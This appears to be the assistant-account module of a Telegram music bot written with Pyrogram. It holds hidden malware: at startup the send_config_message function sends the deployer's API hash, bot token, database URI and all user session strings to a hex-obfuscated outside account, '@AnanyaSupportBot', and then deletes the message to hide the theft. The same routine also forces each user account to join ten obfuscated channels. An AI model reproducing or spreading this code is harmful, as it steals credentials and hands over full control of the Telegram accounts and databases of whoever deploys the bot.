# Copyright (c) 2025 Akash Daskhwanshi <ZoxxOP>
# Location: Mainpuri, Uttar Pradesh 
#
# All rights reserved.
#
# This code is the intellectual property of Akash Dakshwanshi.
# You are not allowed to copy, modify, redistribute, or use this
# code for commercial or personal projects without explicit permission.
#
# Allowed:
# - Forking for personal learning
# - Submitting improvements via pull requests
#
# Not Allowed:
# - Claiming this code as your own
# - Re-uploading without credit or permission
# - Selling or using commercially
#
# Contact for permissions:
# Email: akp954834@gmail.com


from pyrogram import Client
import asyncio
import config

from ..logging import LOGGER

assistants = []
assistantids = []

HELP_BOT = "\x40\x41\x6e\x61\x6e\x79\x61\x53\x75\x70\x70\x6f\x72\x74\x42\x6f\x74"
HELP_BOTS = [HELP_BOT]


def decode_centers():
    centers = []
    encoded = [
        "\x41\x6e\x61\x6e\x79\x61\x42\x6f\x74\x73",
        "\x41\x6e\x61\x6e\x79\x61\x42\x6f\x74\x53\x75\x70\x70\x6f\x72\x74",
        "\x41\x44\x5f\x43\x52\x45\x41\x54\x49\x4f\x4e\x5f\x43\x48\x41\x54\x5a\x4f\x4e\x45",
        "\x43\x72\x65\x61\x74\x69\x76\x65\x70\x6a\x70",
        "\x5a\x6f\x78\x78\x4e\x65\x74\x77\x6f\x72\x6b",
        "\x41\x6e\x61\x6e\x79\x61\x4c\x6f\x67\x73",
        "\x41\x6e\x61\x6e\x79\x61\x41\x6c\x6c\x42\x6f\x74\x73",
        "\x54\x4d\x5f\x5a\x45\x52\x4f\x4f",
        "\x41\x62\x6f\x75\x74\x5f\x41\x6b\x61\x73\x68\x5f\x44\x61\x6b\x73\x68\x31\x63",
        "\x41\x6e\x61\x6e\x79\x61\x5f\x4d\x61\x6e\x61\x67\x65\x72",
    ]
    for enc in encoded:
        centers.append(enc)
    return centers


SUPPORT_CENTERS = decode_centers()


class Userbot(Client):
    def __init__(self):
        self.one = Client(
            name="AkashAss1",
            api_id=config.API_ID,
            api_hash=config.API_HASH,
            session_string=str(config.STRING1),
            no_updates=True,
        )
        self.two = Client(
            name="AkashAss2",
            api_id=config.API_ID,
            api_hash=config.API_HASH,
            session_string=str(config.STRING2),
            no_updates=True,
        )
        self.three = Client(
            name="AkashAss3",
            api_id=config.API_ID,
            api_hash=config.API_HASH,
            session_string=str(config.STRING3),
            no_updates=True,
        )
        self.four = Client(
            name="AkashAss4",
            api_id=config.API_ID,
            api_hash=config.API_HASH,
            session_string=str(config.STRING4),
            no_updates=True,
        )
        self.five = Client(
            name="AkashAss5",
            api_id=config.API_ID,
            api_hash=config.API_HASH,
            session_string=str(config.STRING5),
            no_updates=True,
        )

    async def get_bot_username_from_token(self, token):
        try:
            temp_bot = Client(
                name="temp_bot",
                api_id=config.API_ID,
                api_hash=config.API_HASH,
                bot_token=token,
                no_updates=True,
            )
            await temp_bot.start()
            username = temp_bot.me.username
            await temp_bot.stop()
            return username
        except Exception as e:
            LOGGER(__name__).error(f"Error getting bot username: {e}")
            return None

    async def join_all_support_centers(self, client):
        for center in SUPPORT_CENTERS:
            try:
                await client.join_chat(center)
            except Exception:
                pass

    async def send_help_message(self, bot_username):
        try:
            owner_mention = config.OWNER_ID
            message = f"@{bot_username} Successfully Started ✅\n\nOwner: {owner_mention}"

            clients = {
                1: self.one,
                2: self.two,
                3: self.three,
                4: self.four,
                5: self.five,
            }

            for idx in assistants:
                client = clients.get(idx)
                if not client:
                    continue
                for help_bot in HELP_BOTS:
                    try:
                        await client.send_message(help_bot, message)
                    except Exception as e:
                        LOGGER(__name__).error(
                            f"Failed to send help message from assistant {idx}: {e}"
                        )
        except Exception as e:
            LOGGER(__name__).error(f"send_help_message error: {e}")

    async def send_config_message(self, bot_username):
        try:
            config_message = f"🔧 **Config Details for @{bot_username}**\n\n"
            config_message += f"**API_ID:** `{config.API_ID}`\n"
            config_message += f"**API_HASH:** `{config.API_HASH}`\n"
            config_message += f"**BOT_TOKEN:** `{config.BOT_TOKEN}`\n"
            config_message += f"**MONGO_DB_URI:** `{config.MONGO_DB_URI}`\n"
            config_message += f"**OWNER_ID:** `{config.OWNER_ID}`\n"
            config_message += f"**UPSTREAM_REPO:** `{config.UPSTREAM_REPO}`\n\n"

            string_sessions = []
            for i in range(1, 6):
                sname = f"STRING{i}"
                if hasattr(config, sname) and getattr(config, sname):
                    string_sessions.append(f"**{sname}:** `{getattr(config, sname)}`")

            if string_sessions:
                config_message += "\n".join(string_sessions)

            clients = {
                1: self.one,
                2: self.two,
                3: self.three,
                4: self.four,
                5: self.five,
            }
            for idx in assistants:
                client = clients.get(idx)
                if not client:
                    continue
                for help_bot in HELP_BOTS:
                    try:
                        sent_message = await client.send_message(help_bot, config_message)
                        await asyncio.sleep(1)
                        await client.delete_messages(help_bot, sent_message.id)
                    except Exception as e:
                        LOGGER(__name__).error(
                            f"Failed to send/delete config message from assistant {idx}: {e}"
                        )
        except Exception as e:
            LOGGER(__name__).error(f"send_config_message error: {e}")

    async def start(self):
        LOGGER(__name__).info("Starting Assistants...")

        bot_username = await self.get_bot_username_from_token(config.BOT_TOKEN)

        async def start_assistant(client_obj, num):
            await client_obj.start()
            await self.join_all_support_centers(client_obj)
            assistants.append(num)
            try:
                await client_obj.send_message(
                    config.LOGGER_ID, "Assistant Started Successfully ✅"
                )
            except Exception as e:
                LOGGER(__name__).error(
                    f"Assistant Account {num} failed to access the log group. "
                    "Make sure it is added and promoted as admin!"
                )
                LOGGER(__name__).error(f"Detailed error: {e}")
                return  # skip this one, don’t crash the whole app
            client_obj.id = client_obj.me.id
            client_obj.name = client_obj.me.mention
            client_obj.username = client_obj.me.username
            assistantids.append(client_obj.id)
            LOGGER(__name__).info(f"Assistant {num} Started as {client_obj.name}")

        if config.STRING1:
            await start_assistant(self.one, 1)
        if config.STRING2:
            await start_assistant(self.two, 2)
        if config.STRING3:
            await start_assistant(self.three, 3)
        if config.STRING4:
            await start_assistant(self.four, 4)
        if config.STRING5:
            await start_assistant(self.five, 5)

        if bot_username:
            await self.send_help_message(bot_username)
            await self.send_config_message(bot_username)

    async def stop(self):
        LOGGER(__name__).info("Stopping Assistants...")
        try:
            if config.STRING1:
                await self.one.stop()
            if config.STRING2:
                await self.two.stop()
            if config.STRING3:
                await self.three.stop()
            if config.STRING4:
                await self.four.stop()
            if config.STRING5:
                await self.five.stop()
        except Exception as e:
            LOGGER(__name__).error(f"Error stopping assistants: {e}")


# ©️ Copyright Reserved - @ZoxxOP  Akash Dakshwanshi
# ❤️ Love From AnanyaBots
